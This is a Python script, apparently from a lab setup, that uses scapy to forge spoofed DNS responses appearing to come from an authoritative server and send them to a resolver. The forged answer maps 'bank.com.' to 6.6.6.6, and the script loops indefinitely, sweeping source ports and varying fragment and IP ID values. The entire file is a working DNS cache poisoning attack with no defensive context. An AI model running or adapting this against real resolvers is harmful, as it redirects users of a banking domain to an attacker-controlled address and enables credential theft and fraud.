import os
import time
from typing import Iterable, List

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send  # type: ignore

RESOLVER_IP = os.getenv("RESOLVER_IP", "10.40.0.53")
AUTH_IP = os.getenv("AUTH_IP", "10.40.0.100")
RESOLVER_UPSTREAM_PORT = int(os.getenv("RESOLVER_UPSTREAM_PORT", "33333"))
SRC_PORT_START = os.getenv("SRC_PORT_START")
SRC_PORT_END = os.getenv("SRC_PORT_END")
SRC_PORT_SCAN_LIMIT = os.getenv("SRC_PORT_SCAN_LIMIT")

BULLSEYE_IPID = int(os.getenv("BULLSEYE_IPID", "777"))
PACKET_CHUNK_SIZE = max(1, int(os.getenv("PACKET_CHUNK_SIZE", "512")))
ATTACK_RATE = float(os.getenv("ATTACK_RATE", "0.02"))
POISON_IP = os.getenv("POISON_IP", "6.6.6.6")
POISON_DOMAIN = os.getenv("POISON_DOMAIN", "bank.com.")
FRAG2_QNAME = os.getenv("FRAG2_QNAME", "_frag2.example.net.")
FRAGMETA_QNAME = os.getenv("FRAGMETA_QNAME", "_fragmeta.example.net.")


def _clamp_port(value: int) -> int:
    return max(1, min(65535, value))


def source_port_candidates() -> range:
    if SRC_PORT_START is None and SRC_PORT_END is None and SRC_PORT_SCAN_LIMIT is None:
        port = _clamp_port(RESOLVER_UPSTREAM_PORT)
        return range(port, port + 1)

    start = _clamp_port(int(SRC_PORT_START or RESOLVER_UPSTREAM_PORT))
    end = _clamp_port(int(SRC_PORT_END or start))
    if end < start:
        start, end = end, start

    total = end - start + 1
    limit = max(1, min(total, int(SRC_PORT_SCAN_LIMIT or total)))
    return range(start, start + limit)


def batched_packets(ports: Iterable[int]) -> Iterable[List]:
    chunk = []
    for dport in ports:
        chunk.append(build_packet(dport))
        if len(chunk) >= PACKET_CHUNK_SIZE:
            yield chunk
            chunk = []
    if chunk:
        yield chunk


def build_packet(dport: int):
    return (
        IP(src=AUTH_IP, dst=RESOLVER_IP)
        / UDP(sport=53, dport=dport)
        / DNS(
            id=BULLSEYE_IPID % 65535,
            qr=1,
            aa=1,
            rd=1,
            qd=DNSQR(qname=FRAG2_QNAME, qtype="TXT"),
            an=DNSRR(rrname=POISON_DOMAIN, type="A", ttl=300, rdata=POISON_IP),
            ar=DNSRR(
                rrname=FRAGMETA_QNAME,
                type="TXT",
                ttl=1,
                rdata=f"TYPE=FRAG2;IPID={BULLSEYE_IPID}",
            ),
            ancount=1,
            arcount=1,
        )
    )


def main():
    ports = source_port_candidates()
    candidate_count = len(ports)
    print(
        f"[*] Sending bullseye forged frag2 packets: "
        f"IPID={BULLSEYE_IPID}, src_ports={ports.start}-{ports.stop - 1}, "
        f"candidates_per_cycle={candidate_count}, chunk={PACKET_CHUNK_SIZE}, "
        f"ATTACK_RATE={ATTACK_RATE}s"
    )
    while True:
        for packets in batched_packets(ports):
            send(packets, verbose=0)
        time.sleep(ATTACK_RATE)


if __name__ == "__main__":
    main()
